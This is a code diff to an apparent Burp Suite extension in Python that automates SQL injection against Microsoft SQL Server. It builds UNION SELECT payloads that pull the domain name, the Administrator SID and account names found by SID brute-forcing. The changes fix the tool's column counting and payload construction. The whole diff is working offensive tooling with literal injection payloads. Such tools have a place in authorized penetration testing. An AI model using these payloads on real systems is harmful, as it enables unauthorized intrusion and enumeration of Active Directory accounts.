@@ -170,10 +170,14 @@ class BurpExtender (IBurpExtender, ITab, IBurpExtenderCallbacks, IContextMenuFac
                 bodyOffset = requestInfo.bodyOffset 
                 body = self.requestTxt.text[bodyOffset:]
 
+                content_type = ""
                 for (i, header) in enumerate(headers):
                     if header.lower().startswith("content-type:"):
                         content_type = header.split(":")[1].lower().strip()
                 
+                if content_type == "":
+                    print("[-] No content-type header found. This could have detrimental effects.")
+
                 method = headers[0].split(" ")[0]
                 urlpath = headers[0].split(" ")[1]
 
@@ -223,7 +227,7 @@ class BurpExtender (IBurpExtender, ITab, IBurpExtenderCallbacks, IContextMenuFac
 
             except Exception as ex:
                 stdout.println("Problem parsing the request data" + "\n")
-                self.outputTxt.setText("[-] Problem parsing the request data.")
+                self.outputTxt.setText("[-] Problem parsing the request data. Check debug output for more details.")
                 stdout.println(ex)
 
         return 
@@ -395,6 +399,7 @@ class BurpExtender (IBurpExtender, ITab, IBurpExtenderCallbacks, IContextMenuFac
 
         second_response = self.resp.tostring()
         
+        # Modify logic here if the baseline request and the second response are actually always the same.
         if len(baseline) == len(second_response):
             print("[-] Error determining number of columns. Check payload or encoding")
             self.outputTxt.setText("[-] Error determining number of columns. Check payload or encoding method appropriateness.")
@@ -441,9 +446,18 @@ class BurpExtender (IBurpExtender, ITab, IBurpExtenderCallbacks, IContextMenuFac
             if len(second_response) != len(newdata):
                 valid = False
                 break
+            #Break and error if there are too many columns. This is indicative of a logic error/infinite loop
+            elif i == 50:
+                valid = False
+                print("[-] Could not determine number of columns. Check payload and request data.")
+                break
+                return None
+          
             else:
                 i += 1
                 continue
+
+            
 
         column_number = (i-1)
         print(column_number)
@@ -515,6 +529,8 @@ class BurpExtender (IBurpExtender, ITab, IBurpExtenderCallbacks, IContextMenuFac
         payload = data
         payload += generate_payload(column_number,column_type)
         payload += "(SELECT CONCAT ( 'W00TW00T', (select default_domain()), 'W00TW00T' ) AS Result)--"
+        #payload +=  "(CAST((SELECT CONCAT ( 'W00TW00T', (select default_domain()), 'W00TW00T' ) AS Result) as nvarchar(4000)))"
+        payload += "," + column_type + "--"
 
         encoding = self.encodingBox.getSelectedItem()
         if encoding != "None":
@@ -553,7 +569,9 @@ class BurpExtender (IBurpExtender, ITab, IBurpExtenderCallbacks, IContextMenuFac
         payload = data
         payload += generate_payload(column_number,column_type)
         payload += "(SELECT CONCAT ( 'W00TW00T', (select sys.fn_varbintohexstr(SUSER_SID('%s\\Administrator'))), 'W00TW00T' ) AS Result)--" % domain
-        
+        #payload += "(CAST((SELECT CONCAT ( 'W00TW00T', (select sys.fn_varbintohexstr(SUSER_SID('%s\\Administrator'))), 'W00TW00T' ) AS Result) as nvarchar(4000)))" % domain
+        payload += "," + column_type + "--"
+
         encoding = self.encodingBox.getSelectedItem()
         if encoding != "None":
             payload = payload_processing(payload,encoding)
@@ -604,6 +622,8 @@ class BurpExtender (IBurpExtender, ITab, IBurpExtenderCallbacks, IContextMenuFac
             payload = data
             payload += generate_payload(column_number,column_type)
             payload += "(SELECT CONCAT ( 'W00TW00T', (SUSER_SNAME(SID_BINARY(N'%s%s'))), 'W00TW00T' ) AS Result)--" % (sid,i)
+            #payload += "(CAST(((SELECT CONCAT ( 'W00TW00T', (SUSER_SNAME(SID_BINARY(N'%s%s'))), 'W00TW00T' ) AS Result) as nvarchar(4000)))" % (sid,i)
+            payload += "," + column_type + "--"
 
             encoding = self.encodingBox.getSelectedItem()
             if encoding != "None":
@@ -801,7 +821,7 @@ def generate_payload(column_number,column_type):
     i = 0
     payload = " UNION SELECT "
     
-    while i < (column_number - 1):
+    while i < (column_number - 2):
         payload += (column_type + ",")
         i += 1
 
